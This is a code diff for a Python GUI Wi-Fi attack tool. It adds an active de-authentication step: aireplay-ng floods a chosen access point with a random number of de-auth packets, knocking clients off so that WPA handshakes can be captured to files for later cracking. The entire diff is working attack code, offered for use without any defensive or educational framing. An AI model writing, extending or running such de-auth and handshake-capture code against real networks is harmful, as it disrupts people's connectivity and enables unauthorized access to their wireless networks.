@@ -2,6 +2,8 @@ import tools
 import subprocess
 import os 
 import globs
+import random as rd
+import time
 from tkinter import DISABLED, NORMAL
 
 # some gui operations when attack is launched
@@ -31,7 +33,7 @@ def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_r
     # TODO some bug, will fix later
     if len(current_item['values']) == 0:
         tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
-        stop_attack_btn(tree, scan_btn, stop_attack_btn, tree_on_right_click)
+        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
         return 0
 
     mac, wifi_name, enc, channel = current_item['values'][3], current_item['values'][0], \
@@ -63,6 +65,7 @@ def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_r
                             tools.addToolInfo(T, "Successfully captued handshake of " + str(wifi_name) + \
                                 " !!!.\nCaptured file available at captured_" + str(wifi_name)+'.cap\n\n') 
                             captured = True
+                            globs.stop_attack = False
                             break
                         elif globs.stop_attack: # user clicked stopped attack button
                             globs.stop_attack = False
@@ -72,10 +75,27 @@ def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_r
                             break
 
 
-        # If not passive (active), try to de-auth and capture 
-        if not passive:
-            #TODO implement de-auth using aireplay
-            print("LATER")
+        # If not passive (active/just listening), try to de-auth and capture 
+        if not passive and not captured:
+            tools.addToolInfo(T, "Trying to de-authenticate " + str(wifi_name) + "...\n")
+            # de-auth using aireplay
+            times = rd.randint(5, 12) # random de-auth packets
+            aireplay = subprocess.Popen(('aireplay-ng -0 ' + str(times) + ' -a ' + mac + ' ' + monitor_interface).split(" "), \
+                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)
+
+            root.update()
+            if globs.stop_attack:
+                globs.stop_attack = False
+                airodump.terminate()
+                aireplay.terminate()
+                tools.addToolInfo(T, "Stopped handshake operation.\n\n")
+                captured = True # not really :)
+                break
+
+            aireplay.wait()
+            tools.addToolInfo(T, "Sent " + str(times) + " de-atuh packets. Listening, please wait...\n")
+            t = rd.randint(2, 6) # sleep some random seconds
+            time.sleep(t)
 
     tools.disable_monitor(monitor_interface)
     tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
